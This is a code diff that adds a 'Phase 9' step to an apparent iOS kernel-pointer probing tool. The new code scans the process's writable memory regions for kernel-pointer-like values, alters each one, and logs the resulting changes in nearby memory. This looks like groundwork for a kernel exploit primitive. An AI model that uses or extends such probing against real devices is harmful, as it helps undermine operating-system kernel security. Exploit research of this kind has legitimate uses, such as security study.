@@ -519,6 +519,74 @@ static BOOL isKernelPointer(uint64_t v) {
         break;
     }
 
+    // --- Phase 9: analyze kptr with most diffs ---
+    [report appendString:@"\n--- Phase 9: kptr with most diffs ---\n"];
+
+    scanAddr = 0; scanSize = 0;
+    while (1) {
+        scanAddr = (scanAddr == 0) ? 0 : scanAddr + scanSize;
+        scanCount = VM_REGION_SUBMAP_INFO_COUNT_64;
+        uint32_t d9 = 0;
+        if (vm_region_recurse_64(mach_task_self(), &scanAddr, &scanSize, &d9,
+                                  (vm_region_recurse_info_t)&scanInfo, &scanCount) != KERN_SUCCESS) break;
+        if (scanInfo.is_submap) continue;
+        if (!(scanInfo.protection & VM_PROT_WRITE)) continue;
+
+        volatile uint64_t *rp = (volatile uint64_t *)scanAddr;
+        size_t words = scanSize / 8;
+
+        uint64_t *snap = malloc(scanSize);
+        if (!snap) continue;
+        memcpy(snap, (void *)scanAddr, scanSize);
+
+        // Find kptr with most diffs
+        size_t bestIdx = 0;
+        int bestDiffs = 0;
+        uint64_t bestVal = 0;
+
+        for (size_t i = 0; i < words; i++) {
+            uint64_t v = rp[i];
+            if (!isKernelPointer(v) || v == 0xffffffffffffffffULL) continue;
+
+            rp[i] = v + 0x100;
+            usleep(100);
+            int nd = 0;
+            for (size_t j = 0; j < words; j++) {
+                if (j != i && rp[j] != snap[j]) nd++;
+            }
+            rp[i] = v;
+            usleep(50);
+
+            if (nd > bestDiffs) {
+                bestDiffs = nd;
+                bestIdx = i;
+                bestVal = v;
+            }
+        }
+
+        if (bestDiffs > 0) {
+            [report appendFormat:@"best kptr: +0x%zx = 0x%llx (%d diffs)\n", bestIdx * 8, bestVal, bestDiffs];
+
+            // Modify and record ALL diffs
+            rp[bestIdx] = bestVal + 0x100;
+            usleep(200);
+            for (size_t j = 0; j < words; j++) {
+                if (j == bestIdx) continue;
+                if (rp[j] != snap[j]) {
+                    [report appendFormat:@"  diff at +0x%zx: 0x%llx -> 0x%llx\n",
+                     j * 8, snap[j], rp[j]];
+                }
+            }
+            rp[bestIdx] = bestVal;
+        } else {
+            [report appendString:@"no diffs found\n"];
+        }
+
+        memcpy((void *)scanAddr, snap, scanSize);
+        free(snap);
+        break;
+    }
+
     // --- Verdict ---
     [report appendString:@"\n"];
     if (kptrCount > 0) {
